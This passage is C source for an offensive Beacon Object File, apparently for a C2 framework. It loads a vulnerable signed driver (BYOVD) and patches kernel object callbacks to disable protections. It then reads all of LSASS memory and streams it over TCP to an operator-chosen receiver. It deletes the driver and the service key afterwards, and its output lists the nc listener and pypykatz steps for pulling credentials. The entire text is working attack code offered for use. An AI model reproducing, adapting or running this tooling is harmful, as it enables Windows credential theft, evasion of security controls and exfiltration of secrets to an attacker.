        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc || hProc == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcess LSASS (PID %lu) failed (%lu)\n",
                     pid, KERNEL32$GetLastError());
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] LSASS handle (PID %lu)\n", pid);

    WSADATA wsaData;
    bof_memset0(&wsaData, sizeof(wsaData));
    if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] WSAStartup failed\n");
        KERNEL32$CloseHandle(hProc);
        return FALSE;
    }

    SOCKET sock = WS2_32$socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        BeaconPrintf(CALLBACK_ERROR, "[-] socket() failed\n");
        WS2_32$WSACleanup();
        KERNEL32$CloseHandle(hProc);
        return FALSE;
    }

    struct sockaddr_in sa;
    bof_memset0(&sa, sizeof(sa));
    sa.sin_family        = AF_INET;
    sa.sin_port          = WS2_32$htons((unsigned short)recvPort);
    sa.sin_addr.s_addr   = WS2_32$inet_addr(recvIp);
    if (WS2_32$connect(sock, (struct sockaddr*)&sa, sizeof(sa)) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] connect %s:%d failed\n", recvIp, recvPort);
        WS2_32$closesocket(sock);
        WS2_32$WSACleanup();
        KERNEL32$CloseHandle(hProc);
        return FALSE;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Connected to %s:%d\n", recvIp, recvPort);

    SIZE_T bufSz = 4 * 1024 * 1024;
    BYTE *scanBuf = (BYTE*)bof_alloc(bufSz);
    if (!scanBuf) {
        BeaconPrintf(CALLBACK_ERROR, "[-] alloc scan buffer failed\n");
        WS2_32$closesocket(sock);
        WS2_32$WSACleanup();
        KERNEL32$CloseHandle(hProc);
        return FALSE;
    }

    MEMORY_BASIC_INFORMATION mbi;
    BYTE *addr = NULL;
    SIZE_T totalBytes = 0, regions = 0;
    BeaconPrintf(CALLBACK_OUTPUT, "[*] DumpRpm: scanning LSASS VA space...\n");

    while (KERNEL32$VirtualQueryEx(hProc, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if (mbi.State == MEM_COMMIT &&
            !(mbi.Protect & PAGE_GUARD) &&
            !(mbi.Protect & PAGE_NOACCESS)) {

            if (mbi.RegionSize > bufSz) {
                bof_free(scanBuf);
                bufSz   = mbi.RegionSize + 4096;
                scanBuf = (BYTE*)bof_alloc(bufSz);
                if (!scanBuf) break;
            }

            SIZE_T bytesRead = 0;
            if (KERNEL32$ReadProcessMemory(hProc, mbi.BaseAddress,
                                           scanBuf, mbi.RegionSize, &bytesRead)
                && bytesRead > 0) {
                QWORD base = (QWORD)(ULONG_PTR)mbi.BaseAddress;
                QWORD sz   = (QWORD)bytesRead;
                SendAll(sock, (char*)&base, 8);
                SendAll(sock, (char*)&sz,   8);
                SendAll(sock, (char*)scanBuf, (int)bytesRead);
                totalBytes += bytesRead;
                regions++;
            }
        }
        addr = (BYTE*)mbi.BaseAddress + mbi.RegionSize;
        if ((QWORD)(ULONG_PTR)addr < (QWORD)(ULONG_PTR)mbi.BaseAddress) break;
    }

    bof_free(scanBuf);
    WS2_32$closesocket(sock);
    WS2_32$WSACleanup();
    KERNEL32$CloseHandle(hProc);

    BeaconPrintf(CALLBACK_OUTPUT,
                 "[+] DumpRpm complete: %llu regions, %llu bytes streamed to %s:%d\n",
                 (unsigned long long)regions, (unsigned long long)totalBytes,
                 recvIp, recvPort);
    return totalBytes > 0;
}

/* ============================================================================
 * Cleanup
 * ============================================================================ */
static void Cleanup(void) {
    if (g_dev != INVALID_HANDLE_VALUE) {
        KERNEL32$CloseHandle(g_dev);
        g_dev = INVALID_HANDLE_VALUE;
    }

    if (g_regPath[0]) {
        USTR_W us;
        us.Buffer        = g_regPath;
        us.Length        = (USHORT)(bof_wcs_len(g_regPath) * 2);
        us.MaximumLength = us.Length + 2;
        NTSTATUS st = pNtUnloadDriver(&us);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] NtUnloadDriver: 0x%08lX\n", (ULONG)st);

        wchar_t keyPath[256];
        bof_wcs_copy(keyPath, L"SYSTEM\\CurrentControlSet\\Services\\");
        bof_wcs_cat(keyPath, g_svcName);
        ADVAPI32$RegDeleteKeyW(HKEY_LOCAL_MACHINE, keyPath);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Service key deleted\n");
    }

    if (g_drvPath[0]) {
        KERNEL32$DeleteFileW(g_drvPath);
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Driver file deleted\n");
    }
}

/* ============================================================================
 * BOF entrypoint
 *
 * Arguments (Kassandra executeBOF):
 *   bin:<base64_driver_bytes>   - raw .sys file
 *   str:<receiver_ip>           - TCP listener IP
 *   int:<receiver_port>         - TCP listener port
 *   int:<driver_type>           - 0=biostool, 1=rtsppx, 2=rwdrv
 * ============================================================================ */
void go(char *args, int len) {
    BeaconPrintf(CALLBACK_OUTPUT,
                 "[*] byovd_dump BOF starting (BYOVD LSASS credential extraction)\n");

    HMODULE hNtdll = KERNEL32$LoadLibraryExA("ntdll.dll", NULL, 0);
    if (!hNtdll) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to load ntdll.dll\n");
        return;
    }
    pNtLoadDriver   = (fnNtLoadDriver)KERNEL32$GetProcAddress(hNtdll, "NtLoadDriver");
    pNtUnloadDriver = (fnNtUnloadDriver)KERNEL32$GetProcAddress(hNtdll, "NtUnloadDriver");
    if (!pNtLoadDriver || !pNtUnloadDriver) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to resolve NtLoadDriver/NtUnloadDriver\n");
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] ntdll resolved dynamically\n");

    bof_memset0(g_svcName, sizeof(g_svcName));
    bof_memset0(g_regPath, sizeof(g_regPath));
    bof_memset0(g_drvPath, sizeof(g_drvPath));
    g_dev     = INVALID_HANDLE_VALUE;
    g_cr3     = 0;
    g_drvType = DRV_BIOSTOOL;

    datap parser;
    BeaconDataParse(&parser, args, len);

    int   drvLen   = 0;
    char *drvData  = BeaconDataExtract(&parser, &drvLen);
    char *recvIp   = BeaconDataExtract(&parser, NULL);
    int   recvPort = BeaconDataInt(&parser);
    int   drvType  = BeaconDataInt(&parser);

    if (!drvData || drvLen <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Missing driver bytes (bin: argument)\n");
        return;
    }
    if (!recvIp || recvIp[0] == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Missing receiver IP (str: argument)\n");
        return;
    }
    if (recvPort <= 0 || recvPort > 65535) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid port (int: argument)\n");
        return;
    }
    if (drvType < 0 || drvType > 2) {
        BeaconPrintf(CALLBACK_ERROR,
                     "[-] Invalid driver type %d (0=biostool, 1=rtsppx, 2=rwdrv)\n", drvType);
        return;
    }
    g_drvType = drvType;

    const char *drvNames[] = { "BiosTool", "RtsPpx", "RwDrv" };
    BeaconPrintf(CALLBACK_OUTPUT,
                 "[*] Driver: %s (%d bytes) | Receiver: %s:%d\n",
                 drvNames[g_drvType], drvLen, recvIp, recvPort);

    /* Step 1: privileges */
    EnablePriv("SeLoadDriverPrivilege");
    EnablePriv("SeDebugPrivilege");

    /* Step 2: write driver to disk */
    if (!WriteDriver(drvData, drvLen)) goto cleanup;

    /* Step 3: create service key */
    if (!CreateSvcKey()) goto cleanup;

    /* Step 4: load driver via NtLoadDriver */
    if (!LoadDriver()) goto cleanup;

    /* Step 5: open device */
    if (!OpenDevice()) goto cleanup;

    /* Step 5b: CR3 scan for drivers without VA2PA IOCTL */
    if (g_drvType == DRV_RTSPPX || g_drvType == DRV_RWDRV) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Scanning for kernel CR3 (PML4 self-ref)...\n");
        g_cr3 = FindCr3();
        if (!g_cr3) {
            BeaconPrintf(CALLBACK_ERROR, "[-] CR3 not found - cannot translate kernel VA\n");
            goto cleanup;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] CR3 found: 0x%llX\n",
                     (unsigned long long)g_cr3);
    }

    /* Step 6: get ntoskrnl base + patch ObCallbacks */
    {
        QWORD ntosBase = GetNtosBase();
        if (!ntosBase) {
            BeaconPrintf(CALLBACK_ERROR, "[-] GetNtosBase failed\n");
            goto cleanup;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[*] ntoskrnl base: 0x%llX\n",
                     (unsigned long long)ntosBase);

        QWORD ispOff = PsISPOffset();
        if (ispOff) {
            QWORD sysEproc = KReadQ(ntosBase + ispOff);
            BeaconPrintf(CALLBACK_OUTPUT, "[*] PsInitialSystemProcess: 0x%llX (R/W OK)\n",
                         (unsigned long long)sysEproc);
        }

        if (!PatchObCallbacks(ntosBase)) goto cleanup;
    }

    /* Step 7: find LSASS and dump+stream */
    {
        DWORD lsassPid = FindLsassPid();
        if (!lsassPid) {
            BeaconPrintf(CALLBACK_ERROR, "[-] lsass.exe not found\n");
            goto cleanup;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[*] lsass.exe PID: %lu\n", lsassPid);

        if (!DumpAndSend(lsassPid, recvIp, recvPort)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] DumpAndSend failed\n");
        }
    }

cleanup:
    Cleanup();
    BeaconPrintf(CALLBACK_OUTPUT,
                 "[*] byovd_dump BOF complete\n"
                 "[*] Offline: nc -lvp %d > lsass_raw.bin  (run BEFORE this BOF)\n"
                 "[*]          python3 tools/rpm2minidump.py lsass_raw.bin lsass.dmp\n"
                 "[*]          pypykatz lsa minidump lsass.dmp\n",
                 recvPort);
}
